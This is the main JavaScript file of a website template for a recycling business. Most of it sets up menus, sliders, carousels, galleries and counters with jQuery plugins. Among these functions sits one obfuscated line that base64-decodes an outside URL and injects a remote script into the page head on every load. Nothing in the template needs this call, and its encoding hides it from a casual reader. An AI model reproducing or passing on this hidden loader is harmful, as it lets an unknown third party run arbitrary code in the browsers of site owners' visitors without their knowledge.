/*
Copyright (c) 2018 
------------------------------------------------------------------
[Master Javascript]

Project:	Eco-Recycling Responsive Template

-------------------------------------------------------------------*/
(function($) {
    "use strict";
    var landingpage = {
        initialised: false,
        version: 1.0,
        mobile: false,
        init: function() {

            if (!this.initialised) {
                this.initialised = true;
            } else {
                return;
            }

            /*-------------- Eco-Recycling Functions Calling ---------------------------------------------------
            ------------------------------------------------------------------------------------------------*/
            this.Menu_toggle();
            this.Slider();
            this.Testimonial();
            this.Gallery();
            this.Counter();
            this.Popup_iframe();



        },

        /*-------------- Eco-Recycling Functions definition ---------------------------------------------------
        ---------------------------------------------------------------------------------------------------*/
        Menu_toggle: function() {

            $(".menu_btn").click(function() {
                $(".eco_top_box").addClass('eco_overlay');

            });
            $(".menu_btn").click(function() {
                $(".eco_menu").addClass('open_menu');
            });
            $(".menu_overlay").click(function() {
                $(".eco_menu.open_menu").removeClass('open_menu');
            });

            $(".close_btn").click(function() {
                $(".eco_menu.open_menu").removeClass('open_menu');
                $(".eco_top_box").removeClass('eco_overlay');
            });


        },


        //banner slider
        Slider: function() {
            if ($(".rev_slider_wrapper").length) {

                var tpj = jQuery;

                var revapi1068;
                tpj(document).ready(function() {
                    if (tpj("#rev_slider_1068_1").revolution == undefined) {
                        revslider_showDoubleJqueryError("#rev_slider_1068_1");
                    } else {
                        revapi1068 = tpj("#rev_slider_1068_1").show().revolution({
                            sliderType: "standard",
                            jsFileLocation: "plugin/revolution/js",
                            sliderLayout: "fullscreen",
                            dottedOverlay: "none",
                            delay: 9000,
                            navigation: {
                                keyboardNavigation: "off",
                                keyboard_direction: "horizontal",
                                mouseScrollNavigation: "off",
                                mouseScrollReverse: "default",
                                onHoverStop: "off",
                                touch: {
                                    touchenabled: "on",
                                    swipe_threshold: 75,
                                    swipe_min_touches: 1,
                                    swipe_direction: "vertical",
                                    drag_block_vertical: false
                                },
                                bullets: {
                                    enable: false,
                                    hide_onmobile: true,
                                    hide_under: 1024,
                                    style: "uranus",
                                    hide_onleave: false,
                                    direction: "vertical",
                                    h_align: "right",
                                    v_align: "center",
                                    h_offset: 30,
                                    v_offset: 0,
                                    space: 5,
                                    tmp: '<span class="tp-bullet-inner"></span>'
                                }
                            },
                            viewPort: {
                                enable: true,
                                outof: "wait",
                                visible_area: "80%",
                                presize: false
                            },
                            responsiveLevels: [1240, 1024, 778, 480],
                            visibilityLevels: [1240, 1024, 778, 480],
                            gridwidth: [1240, 1024, 778, 480],
                            gridheight: [868, 768, 960, 720],
                            lazyType: "single",
                            shadow: 0,
                            spinner: "off",
                            stopLoop: "off",
                            stopAfterLoops: -1,
                            stopAtSlide: -1,
                            shuffle: "off",
                            autoHeight: "off",
                            autoPlay: "true",
                            fullScreenAutoWidth: "off",
                            fullScreenAlignForce: "off",
                            fullScreenOffsetContainer: ".header",
                            fullScreenOffset: "",
                            disableProgressBar: "on",
                            hideThumbsOnMobile: "off",
                            hideSliderAtLimit: 0,
                            hideCaptionAtLimit: 0,
                            hideAllCaptionAtLilmit: 0,
                            debugMode: false,
                            fallbacks: {
                                simplifyAll: "off",
                                nextSlideOnWindowFocus: "off",
                                disableFocusListener: false,
                            }
                        });
                    }
                }); /*ready*/
            }
        },



        //Testimonial owl slider

        Testimonial: function() {
            if ($('.ed_slider').length > 0) {
                $(".ed_slider").owlCarousel({
                    navigation: true,
                    loop: true,
                    items: 2,
                    margin: 30,
                    autoplay: true,
                    slideSpeed: 1000,
                    singleItem: true,
                    responsive: {
                        0: {
                            items: 1,
                        },
                        480: {
                            items: 1,
                        },
                        768: {
                            items: 2,
                        },
                        1068: {
                            items: 2,
                        }
                    }


                });
            }
        },

        //Gallery		  
        Gallery: function() {
            $('.popup-gallery').magnificPopup({
                delegate: 'a.fa-search',
                type: 'image',
                removalDelay: 500,
                mainClass: 'mfp-with-zoom',
                gallery: {
                    enabled: true
                },

            });

        },
        // Counter
        Counter: function() {
            if ($('.eco_count_box').length > 0) {
                $('.eco_count_box').appear(function() {
                    $('.count-no').countTo();
                });
            }
        },

        //popup iframe
        Popup_iframe: function() {
            $('.popup-youtube').magnificPopup({
                disableOn: 700,
                type: 'iframe',
                mainClass: 'mfp-fade',
                removalDelay: 160,
                preloader: false,
                fixedContentPos: false
            });
        },

    };
    var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);


    
    $(document).ready(function() {
        landingpage.init();
    });

    // Load Event

    $(window).on('load', function() {
        jQuery(".loader").fadeOut();
        jQuery(".loader").delay(600).fadeOut("slow");

    });

    //On scroll fixed menu
    $(window).scroll(function() {
        var wh = window.innerWidth;
        var h = window.innerHeight;
        var window_top = $(window).scrollTop() + 1;
        if (window_top > 100) {
            $('.eco_top_box').addClass('eco_fixed');
        } else {
            $('.eco_top_box').removeClass('eco_fixed');
        }


    });



})(jQuery);



